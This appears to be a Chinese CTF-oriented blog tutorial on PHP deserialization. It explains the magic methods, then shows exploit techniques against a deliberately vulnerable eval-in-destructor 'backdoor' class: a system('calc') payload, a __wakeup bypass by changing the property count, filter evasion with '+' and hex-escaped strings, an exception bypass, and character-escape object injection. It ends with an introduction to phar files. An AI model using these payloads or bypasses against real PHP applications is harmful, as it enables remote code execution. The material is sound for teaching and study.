<p>同构<code>__sleep</code>方法清理后,<code>move</code>属性并没有进入序列化后的结果和<code>__sleep</code>方法对应的是<code>wakeup</code>方法,表示反序列化时,对所反序列化的属性进行处理<code>wakeup</code>函数可以不需要返回值,时对对象的属性进行一些初始化操作</p>
<p>🌰</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;panda&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$color</span> = <span class="string">&quot;red&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$move</span> = <span class="string">&quot;step&quot;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;i can eat&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;i can sleep&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> [<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;color&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span> -&gt; name = <span class="string">&quot;tiger&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// $a = new Animal();</span></span><br><span class="line"><span class="comment">// echo serialize ($a);</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;O:6:&quot;Animal&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;panda&quot;;s:5:&quot;color&quot;;s:3:&quot;red&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span> -&gt; name;</span><br></pre></td></tr></table></figure>

<p>可以看到,我们这里反序列化的属性值,不管是不是panda,最终反序列化后,都变成了tiger,所以wakeup方法会在反序列化前被调用,用来提前处理属性的值</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210031935656.png" alt="image-20221003193513620"></p>
<h4 id="construct和destruct方法"><a href="#construct和destruct方法" class="headerlink" title="construct和destruct方法"></a>construct和destruct方法</h4><p>和上面方法类似,这里成为构造函数和析构函数</p>
<p>表示对象在实例化时执行的函数和对象要销毁前执行的函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;panda&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$color</span> = <span class="string">&quot;red&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$move</span> = <span class="string">&quot;step&quot;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;i can eat&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;i can sleep&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> [<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;color&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span> -&gt; name = <span class="string">&quot;tiger&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;对象被new时执行&lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;对象被销毁时执行&lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Animal</span>();</span><br></pre></td></tr></table></figure>

<p>也就是说,在PHP代码中,实例化一个对象的时候,会自动调用类的<code>__construct</code>方法,当前php脚本即将运行结束,就会调用已经实例化的类的<code>__destruct</code>方法 所以上面的栗子会先调用前者,再调用后者.</p>
<p>但是,如果单纯的进行反序列化,不实例化对象时,只会调用<code>__destruct</code>方法</p>
<p>这里会是一个明显的调用入口,如果我们反序列化一个拥有<code>__destruct</code>方法的对象时,会自动调用这个析构方法,而如果这个析构方法中,有我们可以控制的值,那么就可以实现我们恶意代码内容</p>
<p>在php反序列化利用，析构方法是很好的入手点，但是我们可能不一定能够找到非常合适的析构方法供我们使用</p>
<h4 id="call和callStatic方法"><a href="#call和callStatic方法" class="headerlink" title="call和callStatic方法"></a>call和callStatic方法</h4><p>在对象中调用一个不可访问的方法时，<code>__call()</code>会被调用</p>
<p>在静态上下文中调用一个不可访问的方法时, <code>__callStatic()</code>会被调用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;i called method&quot;</span>.<span class="variable">$name</span>. <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;args is &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="variable">$args</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cs</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$cs</span>-&gt;<span class="title function_ invoke__">go</span>(<span class="number">1</span>, <span class="string">&quot;CT&quot;</span>,<span class="string">&quot;m4a1&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="get、set和isset、unset"><a href="#get、set和isset、unset" class="headerlink" title="get、set和isset、unset"></a>get、set和isset、unset</h4><ul>
<li>在给不可访问属性赋值时,<code>__set()</code>会被调用.</li>
<li>读取不可访问属性的值时,<code>__get()</code>会被调用.</li>
<li>当对不可访问属性调用<code>isset()</code>或<code>empty()</code>时,<code>__isset()</code>会被调用.</li>
<li>当对不可访问属性调用<code>unset()</code>时,<code>__unset()</code>会被调用.</li>
</ul>
<h4 id="tostring方法"><a href="#tostring方法" class="headerlink" title="tostring方法"></a>tostring方法</h4><p><code>__toString()</code>方法用于一个类被当成字符串时应怎样回应.例如<code>echo $obj;</code>应该显示些什么.此方法必须返回一个字符串,否则将发出一条<code>E_RECOVERABLE_ERROR</code>级别的致命错误.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$secret</span> = <span class="string">&quot;you never know my secret&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hey <span class="subst">$name</span>!&quot;</span>.<span class="variable language_">$this</span>-&gt;secret ;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt; secret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">secret</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"><span class="comment">//相当于执行</span></span><br><span class="line"><span class="comment">//echo $c-&gt;__toString();</span></span><br></pre></td></tr></table></figure>

<p>执行结果</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">you never know my secret</span><br></pre></td></tr></table></figure>

<p>这里直接打印对象实例,会自动调用对象的<code>__toString</code>方法,这里方法名字大小写不敏感</p>
<h4 id="invoke方法"><a href="#invoke方法" class="headerlink" title="invoke方法"></a>invoke方法</h4><p>当尝试以调用函数的方式调用一个对象时<code>__invoke()</code>方法会被自动调用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$secret</span> = <span class="string">&quot;you never know my secret&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hey <span class="subst">$name</span>!&quot;</span>.<span class="variable language_">$this</span> -&gt; secret;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt;<span class="title function_ invoke__">show</span>(<span class="variable">$name</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">secret</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span> (<span class="string">&#x27;charmersix&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>执行结果</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hey charmersix!you never know my secret</span><br></pre></td></tr></table></figure>

<p>前面魔术方法在我们构造反序列化利用链时非常有用，必须掌握，后面方法，相对冷僻，需要熟悉</p>
<h4 id="set-state方法"><a href="#set-state方法" class="headerlink" title="set_state方法"></a>set_state方法</h4><p>自php5.1.0起,当调用<code>var_export()</code>导出类时,此静态方法会被调用</p>
<p>本方法唯一的参数是一个数组,其中包含<code>array(&#39;property&#39;=&gt;value,...)</code>格式排列的类属性</p>
<p>注意,这里是静态方法,和<code>__tostring</code>方法类似,不过这里主要输出类的属性结构</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">static</span> <span class="keyword">object</span> <span class="title function_ invoke__">__set_state</span>(<span class="keyword">array</span> <span class="variable">$properties</span>)</span><br></pre></td></tr></table></figure>

<h4 id="debugInfo方法"><a href="#debugInfo方法" class="headerlink" title="debugInfo方法"></a>debugInfo方法</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">array</span> <span class="title function_ invoke__">__debugInfo</span>(<span class="keyword">void</span>)</span><br></pre></td></tr></table></figure>

<p>当调用<code>var_dump</code>时,调用这个方法,显示类的属性具体结构和值</p>
<h3 id="0x5-反序列化中的绕过"><a href="#0x5-反序列化中的绕过" class="headerlink" title="0x5 反序列化中的绕过"></a>0x5 反序列化中的绕过</h3><h4 id="绕过-wakeup方法"><a href="#绕过-wakeup方法" class="headerlink" title="绕过__wakeup方法"></a>绕过<code>__wakeup</code>方法</h4><p>这个主要是基于CVE-2016-712</p>
<p>具体利用时通过手动修改类的属性个数,让前后不一致时,<code>__wakeup</code>函数就会绕过执行,触发可能存在的漏洞</p>
<p>利用条件</p>
<ul>
<li>php5-5.6.25</li>
<li>php7-7.0.10</li>
</ul>
<p>在这个版本范围之内,可以用这个绕过方法,具体我们看一个栗子</p>
<p>将本地phpstudy中的php调整到5.6</p>
<p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backdoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __wakeup() method.</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backdoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;system(&#x27;calc&#x27;);&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __wakeup() method.</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//$data = $_POST[&#x27;data&#x27;];</span></span><br><span class="line"><span class="comment">//unserialize($data);</span></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">backdoor</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>

<p>这里我们生成的payload是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">8</span>:<span class="string">&quot;backdoor&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">15</span>:<span class="string">&quot;system(&#x27;calc&#x27;);&quot;</span>;&#125;</span><br><span class="line"><span class="comment">//这里的1表示只有一个属性,我们手动改成2,代表有两个,但是实际只有一个,就会报错,绕过__wakeup</span></span><br></pre></td></tr></table></figure>

<h4 id="号绕过正则匹配"><a href="#号绕过正则匹配" class="headerlink" title="+号绕过正则匹配"></a>+号绕过正则匹配</h4><p>如果在输入参数进行了过滤，不允许输入类似<code>O:8</code>这种开头,主要是为了限制不能反序列化对象,这时候,可以通过在数字前面增加一个<code>+</code>号过滤,类似<code>O:+8</code></p>
<h4 id="引用绕过"><a href="#引用绕过" class="headerlink" title="引用绕过"></a>引用绕过</h4><p>php中也可以使用引用符号<code>&amp;</code>,这里就是传址,如果不加,就是传值</p>
<p>传值的最大特点就是引用可以不同,但是指向是相同的</p>
<p>例如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">&amp;<span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;love&quot;</span>.<span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;you&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">add</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure>

<h4 id="Ascii码绕过"><a href="#Ascii码绕过" class="headerlink" title="Ascii码绕过"></a>Ascii码绕过</h4><p>如果在反序列化后的字符串<code>s</code>变更为大写的<code>S</code>后,就会支持将里面的字符按照\xx格式Ascii读取,绕过对关键字的检测</p>
<p>例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">8</span>:<span class="string">&quot;backdoor&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>修改后的payload为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">8</span>:<span class="string">&quot;backdoor&quot;</span>:<span class="number">1</span>:&#123;S:<span class="number">4</span>:<span class="string">&quot;n\97me&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Exception绕过"><a href="#Exception绕过" class="headerlink" title="Exception绕过"></a>Exception绕过</h4><p>Exception是异常，看下面栗子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backdoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/f1ag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;not allow unserialize&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过破坏里面的属性格式，但是类名正确的情况，还是会执行类的析构方法</p>
<p>payload如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">8</span>:<span class="string">&quot;backdoor&quot;</span>:<span class="number">1</span>:&#123;<span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure>

<h4 id="字符逃逸绕过"><a href="#字符逃逸绕过" class="headerlink" title="字符逃逸绕过"></a>字符逃逸绕过</h4><p>php在序列化数据的时候，如果序列化的是字符串，就会保留该字符串的长度，然后将长度写入序列化后的数据，反序列化时就会按照长度进行读取，并且PHP底层实现上是以<code>;</code>作为分割<code>&#125;</code>作为结尾</p>
<p>类中不存在的属性也会进行反序列化,这里就会发生逃逸问题,而导致对象注入</p>
<p>🌰</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backdoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">backdoor</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;m=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;c=<span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>

<p>显示结果:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">8</span>:<span class="string">&quot;backdoor&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;m&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;system;s:1:&quot;</span>c<span class="string">&quot;;s:2:&quot;</span>ls<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p>这里我们如果用双引号,闭合,会发现不能闭合</p>
<p>因为这里长度为8,它反序列化的时候,会从后面第一个双引号开始,读取6个字符作为<code>m</code>的值,即使有双引号,也不能闭合</p>
<p>这里序列化后进行了一次过滤,将<code>system</code>过滤为了<code>ctfshow</code>,最后序列化的结果就成了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">8</span>:<span class="string">&quot;backdoor&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;m&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;ctfshow&quot;</span>;<span class="string">&quot;;s:1:&quot;</span>c<span class="string">&quot;;s:2:&quot;</span>ls<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p>还是从6后面读取6个字符,会读取到<code>ctsho</code>,由于没有闭合,就反序列化失败了,所以这时候,我们就逃出了1个字符w,如果我们写两个<code>system</code>让他过滤,就会得到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">8</span>:<span class="string">&quot;backdoor&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;m&quot;</span>;s:<span class="number">12</span>:<span class="string">&quot;ctfshowctfshow&quot;</span>;<span class="string">&quot;;s:1:&quot;</span>c<span class="string">&quot;;s:2:&quot;</span>ls<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p>观察规律,可以知道:<code>system</code>变成<code>ctfshow</code>的时候,字母数量由12变成了14,但是序列化的时候没有变,所以写入的字符串长度依旧时12</p>
<p>那么按照以前的12个长度进行读取,会把2个字符逃逸出来</p>
<p>如果这两个字符刚好是双引号,分号,就完整的闭合了属性</p>
<p>这里我们用3个system就可以逃逸出3个字符，我们用<code>&quot;;&#125;</code>来结束反序列化读取</p>
<p><code>$b-&gt;m=&#39;systemsystemsystem&quot;;&#125;&#39;;</code>替换后得到<code>O:8:&quot;backdoor&quot;:2:&#123;s:1:&quot;m&quot;;s:21:&quot;ctfshowctfshowctfshow&quot;;&#125;&quot;;s:1:&quot;c&quot;;s:2:&quot;ls&quot;;&#125;</code></p>
<p>可以看到扔掉了c这个属性的值,继续增加system的数量就可以注入我们想要的属性</p>
<h2 id="第三节-phar的反序列化"><a href="#第三节-phar的反序列化" class="headerlink" title="第三节 phar的反序列化"></a>第三节 phar的反序列化</h2><h3 id="0x6-什么是phar"><a href="#0x6-什么是phar" class="headerlink" title="0x6 什么是phar"></a>0x6 什么是phar</h3><p>phar是一类文件的后缀名称，也是php协议的一种</p>
<p>phar可以将多个php文件合并到一个独立的压缩包，相对独立，不用解压到硬盘即可运行php脚本，支持web服务器和命令行运行</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202301291556581.png" alt="image-20230129155652448"></p>
<h3 id="0x7-基于phar的反序列化"><a href="#0x7-基于phar的反序列化" class="headerlink" title="0x7 基于phar的反序列化"></a>0x7 基于phar的反序列化</h3><h4 id="phar怎么用"><a href="#phar怎么用" class="headerlink" title="phar怎么用"></a>phar怎么用</h4><p>正常来说文件包含是这样的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>对于以上典型的文件包含,php底层是这么处理的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;file://flag.php&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>所以要使用<code>phar</code>包里的文件相应的使用<code>phar</code>协议进行包含</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;phar://com.ctfshow.fileUtil.phar/file.php&quot;</span>;  </span><br></pre></td></tr></table></figure>

<p>可以发现很像Java的依赖包</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="comment">//引入util.jar,使用里面的hashmap类,先声明出来,后面要用</span></span><br></pre></td></tr></table></figure>

<p>所以phar就可以认为是类似于Java的一种jar包, 将相对独立的多个php文件打包在一起, 组成一个独立的模块供其他应用调用, 或者干脆自己打包为一个独立的应用, 类似于我们<code>bp.jar</code></p>
<h4 id="phar是怎么生成的"><a href="#phar是怎么生成的" class="headerlink" title="phar是怎么生成的"></a>phar是怎么生成的</h4><p>那么如何打包一个phar文件呢,首先改一下配置文件</p>
<blockquote>
<p>[Phar]<br>; <a href="http://php.net/phar.readonly">http://php.net/phar.readonly</a><br>phar.readonly = Off</p>
</blockquote>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202301291602388.png" alt="image-20230129160252331"></p>
<p>然后我们自己着手写一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;flag.phar&#x27;</span>);</span><br><span class="line"><span class="comment">//phar已经是个对象，然后调用方法</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">buildFromDirectory</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/project&#x27;</span>);</span><br><span class="line"><span class="comment">//public PharData::buildFromDirectory(string $directory)</span></span><br><span class="line"><span class="comment">//dirname() 函数返回路径中的目录名称部分。</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="variable">$phar</span>-&gt; <span class="title function_ invoke__">createDefalutStub</span>(<span class="string">&#x27;index.php&#x27;</span>));</span><br><span class="line"><span class="comment">//final public static Phar::createDefaultStub(?string $index = null, ?string $webIndex = null)</span></span><br></pre></td></tr></table></figure>

<p>然后我们需要新建一个<code>project</code>目录, 里边放上我们要打包的文件<code>/project/index.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;flag&#123;i am in phar&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>

<p>然后我们执行一下第一个<code>index.php</code>, 会发现在本地已经生成了一个<code>flag.phar</code></p>
<p>再写一个<code>include.php</code>来读取我们的phar文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//include.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./flag.phar&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>最终我们执行一下<code>include.php</code>, 就可以读取到flag内容</p>
